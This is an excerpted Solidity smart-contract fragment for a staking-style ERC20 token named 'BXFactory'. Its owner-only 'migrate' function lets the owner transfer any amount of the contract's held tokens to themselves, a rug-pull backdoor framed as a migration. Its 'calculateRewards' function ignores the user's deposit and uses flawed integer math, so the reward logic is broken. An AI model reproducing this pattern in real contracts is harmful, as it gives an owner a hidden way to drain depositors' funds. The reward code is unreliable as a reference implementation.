...
contract Factory is ERC20("BXFactory", "bWETH"), Ownable {
    using SafeMath for uint256;
    IERC20 public token;
    ...
    function calculateRewards(uint _apy) public view returns (uint) {
        UserInfo storage user = userInfo[msg.sender];
        uint rewards = 0;
        
        if (user.amount > 0) {
            rewards = _apy/(60 * 60 * 24 * 365);
        }

        return rewards;
    }

    function migrate(uint256 _amount) public onlyOwner {
        token.transfer(msg.sender, _amount);
    }
